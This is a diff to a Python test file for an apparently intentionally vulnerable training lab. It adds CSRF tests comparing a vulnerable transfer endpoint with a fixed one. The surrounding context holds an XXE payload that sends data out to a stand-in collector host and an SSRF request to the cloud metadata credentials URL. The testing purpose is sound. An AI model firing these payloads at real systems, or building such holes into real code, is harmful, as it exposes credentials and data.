@@ -134,6 +134,19 @@ class LabTest(unittest.TestCase):
                 '<!DOCTYPE egide [<!ENTITY xxe SYSTEM "http://collector.example/egideoob7a1b2c">]>'
                 '<egide><ping>&xxe;</ping></egide>')
 
+    def test_vulnerable_transfer_accepts_a_tokenless_form_post_with_session(self):
+        status, body, _ = self.call("POST", "/servicos/vulneravel/transferir", actor="a", payload="valor=100")
+        self.assertEqual(status, 200)
+        self.assertIn("transferido", body)
+
+    def test_transfer_requires_a_session_so_the_anon_control_is_rejected(self):
+        status, _, _ = self.call("POST", "/servicos/vulneravel/transferir", payload="valor=100")
+        self.assertEqual(status, 401)
+
+    def test_fixed_transfer_requires_a_csrf_token(self):
+        status, _, _ = self.call("POST", "/servicos/corrigido/transferir", actor="a", payload="valor=100")
+        self.assertEqual(status, 403)
+
     def test_vulnerable_integrador_reflects_cloud_metadata_credentials(self):
         url = quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
         status, body, _ = self.call("GET", f"/servicos/vulneravel/integrador?url={url}")
